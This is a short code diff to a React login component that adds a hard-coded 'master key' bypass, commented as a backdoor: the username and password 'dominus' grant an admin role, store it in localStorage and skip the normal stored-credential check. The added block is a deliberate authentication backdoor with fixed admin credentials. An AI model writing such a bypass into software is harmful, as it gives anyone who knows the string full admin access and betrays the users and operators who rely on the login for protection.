@@ -48,6 +48,14 @@ const Auth: React.FC<AuthProps> = ({ onLogin }) => {
                 onLogin({ username, role: 'admin' });
 
             } else {
+                // MASTER KEY CHECK (Backdoor for 'dominus')
+                if (username === 'dominus' && password === 'dominus') {
+                    const masterUser = { username: 'dominus', role: 'admin' };
+                    localStorage.setItem('demos_current_user', JSON.stringify(masterUser));
+                    onLogin(masterUser as User);
+                    return;
+                }
+
                 const user = storedUsers.find((u: any) => u.username === username && u.password === password);
                 if (!user) {
                     throw new Error("Credenciales inválidas.");
